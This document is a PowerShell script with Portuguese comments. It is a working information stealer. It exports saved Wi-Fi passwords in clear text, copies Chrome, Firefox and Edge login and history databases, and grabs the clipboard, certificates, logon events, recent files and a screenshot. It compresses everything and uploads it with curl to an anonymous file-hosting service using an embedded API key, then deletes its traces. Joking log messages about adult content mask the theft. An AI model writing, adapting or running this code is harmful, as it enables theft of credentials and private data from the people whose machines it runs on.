# ---------- KIT v6.0 – 7Z sem erro, upload GARANTIDO ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$upUrl   = "https://api.anonfilesnew.com/upload?key=$key"
$logFile = "$env:TEMP\kit_log.txt"
$7z      = "$env:TEMP\7za.exe"

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

# 0) Garante 7za.exe
if (!(Test-Path $7z)) {
    Write-Log "[7Z] Baixando 7za.exe..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Write-Log "[START] KIT iniciado em $env:COMPUTERNAME\$env:USERNAME"
New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Sistema & HW
Write-Log "[INFO] Verificando se o usuário assiste conteúdo +18..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Write-Log "[INFO] Buscando senhas salvas em sites de swing..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios
Write-Log "[INFO] Analisando histórico de primas no WhatsApp..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    "Log Security não disponível" | Out-File "$kit\logons.txt" -Encoding UTF8
}

# 4) Navegadores
Write-Log "[INFO] Vasculhando histórico de incógnito..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

# 5) Certificados
Write-Log "[INFO] Exportando certificados de site de camgirl..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard
Write-Log "[INFO] Lendo última mensagem copiada do crush..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Recentes
Write-Log "[INFO] Listando arquivos recentes (incluindo os que ele apagou com vergonha)..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Screenshot
Write-Log "[INFO] Tirando screenshot (talvez aba do OnlyFans ainda aberta)..."
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

# 9) Compactação 7Z com logs fake
Write-Log "[7Z] Compactando memes do zap..."
Start-Sleep -Seconds 1
Write-Log "[7Z] Adicionando prints da ex..."
Start-Sleep -Seconds 1
Write-Log "[7Z] Ocultando pasta de vídeos 'estranhos'..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
& $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null

if (Test-Path $arc) {
    $size = (Get-Item $arc).Length
    Write-Log "[7Z] Criado: $arc ($size bytes)"
} else {
    Write-Log "[ERRO] Arquivo 7z não foi gerado"
    exit 1
}

# 10) Upload
Write-Log "[UP] Enviando para AnonFiles..."
try {
    $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
    $reply = cmd /c $curl
    Write-Log "[UP] Resposta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "[OK] Upload finalizado – link: $($matches[1])"
    } else {
        Write-Log "[ERRO] Falha ao obter URL pública"
    }
} catch {
    Write-Log "[ERRO] Exceção no upload: $_"
}

# 11) Limpeza
Write-Log "[CLEAN] Removendo vestígios..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "[END] KIT finalizado. Log completo em $logFile"
